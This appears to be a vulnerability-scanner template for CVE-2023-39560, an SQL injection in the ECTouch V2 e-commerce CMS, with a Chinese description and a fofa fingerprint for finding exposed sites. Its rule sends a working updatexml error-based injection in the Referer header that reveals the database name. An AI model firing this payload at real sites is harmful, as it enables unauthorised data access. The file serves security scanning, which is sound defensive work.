id: CVE-2023-39560

info:
  name: ECTouch V2 CMS电商系统存在SQL注入漏洞
  author: Y3y1ng
  severity: critical
  verified: true
  description: |-
    ECTouch是一款移动商城网店系统，包含小程序+微商城+手机h5端。ECTouch v2可以通过\default\helpers\insert.php处的$arr['id']实现SQL注入漏洞。
    fofa: icon_hash="127711143"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-39560
    - https://github.com/Luci4n555/cve_ectouch
  tags: cve,cve2023,ECTouch,cms
  created: 2023/12/04

rules:
  r0:
    request:
      method: GET
      path: /index.php?m=default&c=user&a=register&u=0
      headers:
        Referer: 554fcae493e564ee0dc75bdf2ebf94cabought_notes|a:1:{s:2:"id";s:49:"0&&updatexml(1,concat(0x7e,(database()),0x7e),1)#";}
      follow_redirects: true
    expression: |
      response.status == 200 && "XPATH syntax error: '~(.*)~'".bmatches(response.body)
expression: r0()
